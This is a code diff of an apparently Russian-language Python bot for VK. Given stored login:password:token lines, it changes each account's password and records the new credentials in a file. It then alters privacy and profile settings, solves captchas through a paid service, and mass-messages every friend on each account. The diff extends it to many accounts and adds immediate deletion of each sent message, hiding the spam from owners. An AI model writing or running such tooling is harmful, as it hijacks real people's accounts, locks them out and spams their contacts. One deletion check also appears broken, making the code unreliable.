@@ -8,10 +8,10 @@ from python_rucaptcha import ImageCaptcha
 def read_token():
     """
     Чтение файла с данными авторизации token.txt
-    :return ['login:password:token']
+    :return ['login1:password1:token1', 'login2:password2:token3', ...]
     """
     with open('token.txt') as file:
-        auth_data = file.readline().split(':')
+        auth_data = file.readlines()
 
     print('[INFO] Данные из файла token.txt прочитаны.')
 
@@ -39,8 +39,8 @@ def change_password(auth_data, new_password):
 
         # Если смена пароля успешна, то записываем в файл spam.txt
         if resp.status_code == requests.codes.ok and 'response' in resp_json:
-            with open('spam.txt', 'w') as file:
-                file.write(f'{auth_data[0]}:{new_password}:{token}')
+            with open('spam.txt', 'a') as file:
+                file.write(f'{auth_data[0]}:{new_password}:{token}\n')
             print('[INFO] Смена пароля выполнена успешно!\n'
                   'Новые данные сохранены в файле spam.txt')
             return token
@@ -297,6 +297,7 @@ def send_me_msg(user_id, token):
 def send_msg(friend, message_txt, forward_msg, token):
     """Рассылка сообщений"""
     method = 'https://api.vk.com/method/messages.send'
+    method_delete_msg = 'https://api.vk.com/method/messages.delete'
     params_def = {
         'user_id': friend,
         'random_id': 0,
@@ -312,6 +313,19 @@ def send_msg(friend, message_txt, forward_msg, token):
 
         if 'response' in resp:
             print('[INFO] Сообщение отправлено.')
+            message_id = resp.get('response')
+            params_delete_msg = {
+                'message_ids': message_id,
+                'access_token': token,
+                'v': '5.131'
+            }
+            resp_del_msg = requests.get(method_delete_msg, params_delete_msg).json()
+            if 'response' in resp_del_msg and 1 in resp_del_msg.get('response').get(message_id) == 1:
+                print('[INFO] Сообщение удалено.')
+            else:
+                print('[ERROR] Возникла ошибка при удалении сообщения.\n'
+                      f'{resp_del_msg}')
+
         elif 'error' in resp:
             if resp.get('error').get('error_code') == 14:
                 print('[INFO] Выполняется решении каптчи.')
@@ -389,28 +403,29 @@ def main():
     coordinate_y = int(input('Введите координату y: '))
     message_txt = input('Введите текст сообщения: ')
     auth_data = read_token()
-    sleep(3)
-    token = change_password(auth_data, new_password)
-    sleep(3)
-    set_privacy(token)
-    sleep(3)
-    user_info = get_user_info(token)
-    sleep(3)
-    change_img(user_info, coordinate_x, coordinate_y)
-    sleep(3)
-    # story_info = upload_stories(token)
-    sleep(3)
-    friends = get_friends(token)
-    sleep(3)
-    id_msg = send_me_msg(user_id=user_info[0], token=token)
 
-    count = 0
-    for friend in friends:
-        send_msg(friend=friend, message_txt=message_txt, forward_msg=id_msg, token=token)
-        count += 1
-        print(f'[INFO] Сообщение {count} из {len(friends)}.\n'
-              f'Пауза на {wait} секунд.')
-        sleep(wait)
+    for auth in auth_data:
+        auth_data_list = auth.strip('\n').split(':')
+        token = change_password(auth_data_list, new_password)
+        sleep(3)
+        set_privacy(token)
+        sleep(3)
+        user_info = get_user_info(token)
+        change_img(user_info, coordinate_x, coordinate_y)
+        friends = get_friends(token)
+        sleep(3)
+        id_msg = send_me_msg(user_id=user_info[0], token=token)
+
+        count_friends = 0
+        count_account = 0
+        for friend in friends:
+            send_msg(friend=friend, message_txt=message_txt, forward_msg=id_msg, token=token)
+            count_friends += 1
+            count_account += 1
+            print(f'[INFO] Сообщение {count_friends} из {len(friends)}.\n'
+                  f'[INFO] Аккаунт {count_account} из {len(auth_data)}.\n'
+                  f'Пауза на {wait} секунд.')
+            sleep(wait)
 
 
 if __name__ == '__main__':
